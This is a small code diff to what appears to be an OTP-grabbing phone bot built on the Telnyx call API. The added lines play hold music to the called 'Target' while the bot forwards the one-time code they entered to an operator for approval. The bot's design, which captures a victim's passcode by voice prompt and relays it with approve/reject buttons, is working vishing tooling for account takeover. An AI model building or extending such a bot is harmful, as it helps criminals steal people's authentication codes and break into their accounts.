@@ -5825,6 +5825,11 @@ async function handleOutboundIvrGatherEnded(payload) {
       
       // Put caller on hold while bot user reviews
       await _telnyxApi.speakOnCall(callControlId, 'Thank you. Please hold while we verify your code.', getTelnyxVoice(session.voiceName))
+      // Comfort hold music during verification, when the user turned it on at setup (stops on confirm/reject/hangup/speak).
+      if (session.holdMusic) {
+        const afterSpeak = () => _telnyxApi.playbackStart(callControlId, HOLD_MUSIC_URL, { loop: 'infinity' }).catch(() => {})
+        setTimeout(() => { if (outboundIvrCalls[callControlId]?.phase === 'otp_hold') afterSpeak() }, 3500)
+      }
       
       // Notify bot user with OTP + approve/reject buttons
       const msg = `🔑 <b>OTP Collected</b>\n\n📞 Target: ${session.targetNumber}\n🔢 Code: <code>${digits}</code>\n\n⏳ Caller is on hold. Approve or reject:`
@@ -6448,6 +6453,7 @@ async function resolveOtp(callControlId, action) {
   const session = outboundIvrCalls[callControlId]
   if (!session) return { error: 'ended' }
   if (session.phase !== 'otp_hold') return { error: 'not_waiting', phase: session.phase }
+  if (session.holdMusic) await _telnyxApi.playbackStop(callControlId).catch(() => {})
   const voice = getTelnyxVoice(session.voiceName)
   if (action === 'accept') {
     session.phase = 'otp_confirmed'
